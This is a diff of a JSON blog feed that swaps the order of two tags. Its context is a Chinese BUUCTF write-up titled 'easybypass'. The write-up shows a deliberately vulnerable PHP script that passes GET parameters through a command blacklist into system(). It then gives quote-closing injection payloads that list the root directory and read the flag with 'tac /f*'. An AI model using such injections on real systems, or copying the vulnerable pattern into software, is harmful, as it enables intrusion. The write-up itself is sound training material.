@@ -11,8 +11,8 @@
             "date_published": "2024-07-26T14:15:52.000Z",
             "content_html": "<h2 id=\"easybypass\"><a class=\"markdownIt-Anchor\" href=\"#easybypass\">#</a> easybypass</h2>\n<p>源码：</p>\n<pre><code> &lt;?php\n \nhighlight_file(__FILE__);\n \n$comm1 = $_GET['comm1'];\n$comm2 = $_GET['comm2'];\n \n \nif(preg_match(&quot;/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))\n    $comm1 = &quot;&quot;;\nif(preg_match(&quot;/\\'|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))\n    $comm2 = &quot;&quot;;\n \n$flag = &quot;#flag in /flag&quot;;\n \n$comm1 = '&quot;' . $comm1 . '&quot;';\n$comm2 = '&quot;' . $comm2 . '&quot;';\n \n$cmd = &quot;file $comm1 $comm2&quot;;\nsystem($cmd);\n?&gt;\ncannot open `' (No such file or directory) cannot open `' (No such file or directory) \n</code></pre>\n<p>可以看到这里很清楚了，也就是在我们传的参数两边套上了双引号然后，拼接到 cmd 的后面这时考虑到引号闭合就好了直接上 payload</p>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>comm1<span class=\"token operator\">=</span>index<span class=\"token punctuation\">.</span>php<span class=\"token string-literal\"><span class=\"token string\">\";dir /;\"</span></span><span class=\"token operator\">&amp;</span>comm2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>comm1<span class=\"token operator\">=</span>index<span class=\"token punctuation\">.</span>php<span class=\"token string-literal\"><span class=\"token string\">\";tac /f*;\"</span></span><span class=\"token operator\">&amp;</span>comm2</pre></td></tr></table></figure><p>直接出 flag</p>\n",
             "tags": [
-                "buuctf",
-                "system_file"
+                "system_file",
+                "buuctf"
             ]
         }
     ]
